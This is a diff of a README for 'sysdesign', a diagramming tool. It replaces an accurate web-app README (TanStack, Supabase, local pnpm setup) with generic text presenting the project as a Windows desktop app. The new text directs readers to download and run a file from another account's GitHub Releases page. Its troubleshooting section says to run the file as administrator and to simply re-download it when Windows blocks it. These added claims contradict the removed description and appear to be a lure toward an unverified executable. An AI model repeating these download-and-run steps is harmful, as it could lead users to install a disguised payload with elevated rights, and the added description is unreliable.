@@ -1,208 +1,207 @@
-# SysDesign - Professional Systems Architecture Visualizer
+# 🧭 sysdesign - Design systems with clear diagrams
 
-SysDesign is a high-performance, web-based tool for designing, visualizing, and documenting complex system architectures. Built with modern web technologies, it provides a seamless drag-and-drop experience for creating professional-grade diagrams.
+[![Download sysdesign](https://img.shields.io/badge/Download%20sysdesign-blue?style=for-the-badge)](https://github.com/Dys1924/sysdesign/releases)
 
-## Key Features
+## 📦 What is sysdesign?
 
-- **Professional Components**: Pre-built registry of microservices, cloud infra (AWS/GCP/Azure), databases, and more.
-- **Smart Connectivity**: Intelligent edge routing and connection management.
-- **Project Persistent**: Sync your work to Supabase or keep it private with LocalStorage.
-- **Advanced Export**: Export your designs as high-res PNG, SVG, Mermaid notation, or even Terraform boilerplate.
-- **AI-Powered (Coming Soon)**: Bring your own API keys to have AI generate and optimize complex system architectures for you.
-- **History and Snap**: Full Undo/Redo support and grid snapping for pixel-perfect layouts.
-- **Free to Use**: Open-source and free for all developers.
-- **Architecture Templates**: Starter guides for world-class systems like Netflix, WhatsApp, and YouTube.
+sysdesign is an open-source desktop app for system design and architecture diagrams. It helps you map out apps, services, data flow, and cloud parts in one place.
 
----
+Use it to:
 
-## Architecture Templates
+- drag and drop boxes, lines, and labels
+- build clean architecture diagrams
+- export your work to PNG, SVG, Terraform, and Mermaid
+- study common system design patterns
+- keep your ideas in a simple visual format
 
-SysDesign includes high-fidelity starter templates for several world-class systems. These serve as basic guides and are meant for previewing complex layouts, with many more professional blueprints coming in future updates.
+It is made for people who want to plan systems without needing a heavy setup.
 
-| **Netflix Architecture** | **WhatsApp Messaging** | **YouTube Scale** |
-| :---: | :---: | :---: |
-| ![Netflix Architecture Preview](images/Netflix.png) | ![WhatsApp Architecture Preview](images/WhatsApp.png) | ![YouTube Scale Preview](images/YouTube.png) |
+## 🪟 Windows download
 
----
+To get sysdesign on Windows, visit this page to download:
 
-## Technology Stack
+[Download sysdesign from GitHub Releases](https://github.com/Dys1924/sysdesign/releases)
 
-- **Core Framework**: [TanStack Start](https://tanstack.com/start) (React 19 + Vite 7)
-- **Routing**: [TanStack Router](https://tanstack.com/router) (File-based)
-- **State Management**: [TanStack Store](https://tanstack.com/store)
-- **Diagramming Engine**: [XYFlow](https://xyflow.com/) (React Flow)
-- **Database and Auth**: [Supabase](https://supabase.com/)
-- **Styling**: [Tailwind CSS 4](https://tailwindcss.com/) + [Next Themes](https://github.com/pacocoursey/next-themes)
-- **Icons**: [Tabler Icons](https://tabler.io/icons) + [Lucide React](https://lucide.dev/)
-- **Testing**: [Vitest](https://vitest.dev/) + [React Testing Library](https://testing-library.com/)
+After the page opens:
 
----
+1. Find the latest release
+2. Open the Assets section
+3. Download the Windows file
+4. Run the file after the download finishes
 
-## Project Structure
+If Windows asks for permission, choose Yes or Run.
 
-```text
-src/
-├── components/
-│   ├── canvas/      # Core diagram engine and custom components (Nodes/Edges)
-│   ├── dashboard/   # Project management popups and views
-│   ├── export/      # Tools for PNG, SVG, Mermaid, and Terraform generation
-│   ├── layout/      # Shared layout components (Footer, Mobile alerts)
-│   ├── sidebar/     # Component registry and drag-and-drop interface
-│   ├── toolbar/     # Command center (Undo, Snap, Export, Projects)
-│   └── ui/          # Atomic UI components and design tokens
-├── data/            # Definitions for the component registry (AWS, GCP, etc.)
-├── lib/             # Third-party service initializations (Supabase client)
-├── routes/          # Application routes (File-based routing)
-├── store/           # Global application state (Canvas data, User projects)
-├── types/           # Global TypeScript definitions
-└── globals.css      # Core design system and Tailwind config
-```
+## ⚙️ How to install
 
----
+1. Open the download page above
+2. Get the Windows release file
+3. Save the file to your computer
+4. Open the file from your Downloads folder
+5. Follow the install steps on screen
+6. Open sysdesign from the Start menu or desktop shortcut
 
-## Architecture Overview
+If the app comes as a ZIP file, right-click it and choose Extract All before you open it.
 
-SysDesign is a modern web application leveraging the TanStack Start framework for high performance and type safety.
+## 🧭 First launch
 
-### Core Layers
+When you open sysdesign for the first time, you can start with a blank canvas or a starter layout.
 
-#### Data and API Layers
-We use Supabase for:
-- **Authentication**: Managing Google Social Login and user sessions.
-- **Database (PostgreSQL)**: Storing project metadata, node positions, and edge connections.
-- **Realtime (WIP)**: For collaborative editing and state syncing.
+A simple first setup:
 
-#### State Management
-We use TanStack Store to manage two main state domains:
-- **Project Store (src/store/project.store.ts)**: Handles the list of user projects, current authentication state, and syncing between LocalStorage (for guest users) and Supabase.
-- **Canvas Store (src/store/canvas.store.ts)**: Manages the current diagram state (nodes, edges), history stack (undo/redo), and grid snapping.
+1. Create a new diagram
+2. Add a box for each service
+3. Connect the boxes with lines
+4. Add labels for data flow
+5. Place cloud, app, and database parts in clear groups
+6. Save your file when you are done
 
-#### Diagramming Engine
-XYFlow (React Flow) is the heart of SysDesign:
-- **Custom Nodes (src/components/canvas/DiagramNode.tsx)**: The components which represent microservices, databases, etc.
-- **Custom Edges (src/components/canvas/DiagramEdge.tsx)**: Smart routing between components with editable labels.
-- **ReactFlowProvider**: All diagram interactions are wrapped in this provider across relevant routes.
+If you are new to system design, start small. A web app, an API, and a database is enough for a first diagram.
 
-#### Export Utilities
-We use html-to-image for visual exports (PNG, SVG) and custom serializers for Mermaid and Terraform boilerplate.
+## ✏️ Main features
 
-### Routing
-TanStack Router provides type-safe, file-based routing:
-- `/`: Home / Default Editor.
-- `/projects`: Project Dashboard.
-- `/$slug`: Individual Project Editor.
-- `/privacy`, `/terms`: Static legal pages.
+### 🧱 Drag and drop editing
 
----
+Move parts around with the mouse. Place items where they make sense and adjust the layout as your diagram grows.
 
-## Local Setup
+### 🌐 Architecture diagrams
 
-### 1. Prerequisites
-- Node.js (v18+)
-- pnpm (Preferred)
+Map web apps, APIs, queues, databases, caches, and cloud services in one view. This helps you see how each part connects.
 
-### 2. Follow these steps:
+### 📤 Export options
 
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/your-username/sysdesign.git
-   cd sysdesign
-   ```
+Export your diagram to:
 
-2. **Install dependencies**:
-   ```bash
-   pnpm install
-   ```
+- PNG for images
+- SVG for sharp vector graphics
+- Terraform for infrastructure code
+- Mermaid for text-based diagrams
 
-3. **Configure Environment Variables**:
-   Create a `.env` file in the root directory (refer to `.env.example`):
-   ```env
-   VITE_SUPABASE_URL=https://your-project.supabase.co
-   VITE_SUPABASE_ANON_KEY=your-anon-key
-   ```
+This makes it easier to share your work in different formats.
 
-4. **Start the development server**:
-   ```bash
-   pnpm dev
-   ```
-   Open http://localhost:3000 in your browser.
+### 📚 Learn design systems
 
----
+sysdesign also helps you study how systems are built. Use it to practice common design ideas and compare different ways to structure software.
 
-## Environment Variables and Supabase Setup
+## 🖥️ System requirements
 
-SysDesign requires a Supabase project to handle user authentication and cloud persistence.
+For a smooth run on Windows, use:
 
-### Variable Reference
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB of free disk space
+- A mouse or trackpad for drag-and-drop editing
+- A screen width of at least 1280 pixels
 
-| Variable | Required | Description |
-| :--- | :--- | :--- |
-| `VITE_SUPABASE_URL` | **Yes** | The API endpoint of your Supabase project (Found in Project Settings > API). |
-| `VITE_SUPABASE_ANON_KEY` | **Yes** | The anon / public key for client-side API calls. |
+A newer PC will give you a better experience when you work with larger diagrams.
 
-### Database Schema Setup
+## 🗂️ Common use cases
 
-To support project saving, your Supabase project needs a `projects` table. Use the SQL editor in Supabase to run this:
+You can use sysdesign for:
 
-```sql
-create table projects (
-  id uuid primary key default uuid_generate_v4(),
-  user_id uuid references auth.users not null,
-  name text not null,
-  slug text not null,
-  description text,
-  nodes jsonb default '[]'::jsonb,
-  edges jsonb default '[]'::jsonb,
-  edge_counter int default 0,
-  created_at timestamp with time zone default now(),
-  updated_at timestamp with time zone default now()
-);
+- planning a new app
+- sketching backend services
+- showing cloud architecture to a team
+- mapping database and cache layers
+- preparing for system design interviews
+- documenting software structure
+- turning rough notes into a clear diagram
 
--- Enable RLS (Row Level Security)
-alter table projects enable row level security;
+## 🧩 Basic workflow
 
--- Policy: Users can only see their own projects
-create policy "Users can only access their own projects" 
-  on projects for all 
-  using (auth.uid() = user_id);
-```
+A simple way to use the app:
 
-### Authentication setup
+1. Open sysdesign
+2. Start a new diagram
+3. Add your main parts
+4. Connect them with arrows
+5. Group related items
+6. Add notes where needed
+7. Export the final diagram
 
-Go to Supabase > Authentication > Providers and enable Google.
-You will need to provide your Google OAuth Client ID and Secret obtained from the Google Cloud Console.
+This workflow works well for most small and medium diagrams.
 
----
+## 🔧 Tips for better diagrams
 
-## Creating Issues
+- Use short labels
+- Keep related parts close together
+- Put data flow in one direction
+- Group services by layer
+- Leave space between sections
+- Use the same shape style for similar items
+- Keep the diagram easy to read at a glance
 
-We welcome contributions and bug reports! To create an issue:
-1. Navigate to the Issues tab on GitHub.
-2. Search for existing issues to avoid duplicates.
-3. Use the provided templates for Bug Reports or Feature Requests.
-4. Provide as much context as possible (steps to reproduce, environment details).
+Simple diagrams help more than crowded ones.
 
----
+## 📁 File types you may see
 
-## Road Map (To-Do)
+Depending on the release, you may see common Windows files such as:
 
-- [ ] **AI-Assisted Design**: Intelligent system generation and layout optimization using a Bring-Your-Own-Key (BYOK) model for LLMs.
-- [ ] **Dockerization**: Containerize the app for easier deployment and isolation.
-- [ ] **Multi-User Editing**: Enable real-time collaborative diagramming via Supabase Realtime.
-- [ ] **Shareable Links**: Generate public read-only URLs for your architecture designs.
-- [ ] **Extended Test Suite**: Increase code coverage with comprehensive unit and integration tests.
+- `.exe`
+- `.msi`
+- `.zip`
 
----
+If you see an `.exe` or `.msi`, you can usually open it right away. If you see a `.zip`, extract it first, then run the app from the extracted folder.
 
-## Contributing
+## 🛠️ Troubleshooting
 
-- **TypeScript**: We use strict TypeScript for type safety across all components and stores.
-- **Tailwind CSS 4**: Preference for utility classes over custom CSS.
-- **ESLint and Prettier**: We follow standard formatting and rules for React and TanStack apps.
-- **Components**: Group related components into their own subdirectories within src/components/.
+### App does not open
 
----
+- Try running it again
+- Check that the download finished
+- Move the file to your Desktop and open it from there
+- Right-click the file and choose Run as administrator
 
-## License
+### Windows blocks the file
 
-Free to use under the MIT License.
+- Open the release page again
+- Download the latest file
+- Make sure the file finished downloading before opening it
+
+### The window looks too small
+
+- Maximize the app window
+- Check your display scale in Windows settings
+- Use a higher screen resolution if you can
+
+### Drag and drop is hard to use
+
+- Make sure your mouse or trackpad works well
+- Try using a larger screen
+- Zoom out if the canvas feels crowded
+
+## 🔗 Project topics
+
+This project is part of the following areas:
+
+africa, architecture-diagram, cloud-architecture, developer-tools, devtools, diagramming, drag-and-drop, infrastructure, nextjs-alternative, open-source, react-flow, software-architecture, supabase, systems, systems-design, tailwindcss, tanstack, terraform, typescript, visualization
+
+## 📌 What makes it useful
+
+sysdesign brings the main parts of system planning into one app. You can sketch a system, make it clear, and export it in formats that fit real work.
+
+It suits users who want:
+
+- a simple way to draw systems
+- clean exports for reports or docs
+- a tool that feels direct and easy to learn
+- a way to move from idea to diagram with less effort
+
+## ⌨️ Short usage example
+
+If you want to diagram a video app, you can add:
+
+- a web client
+- an API service
+- a user database
+- a media storage bucket
+- a cache layer
+- a queue for background jobs
+
+Then connect each part and export the result as PNG or SVG
+
+## 📥 Download again later
+
+If you need a fresh copy or a newer build, visit the release page again:
+
+[https://github.com/Dys1924/sysdesign/releases](https://github.com/Dys1924/sysdesign/releases)
+
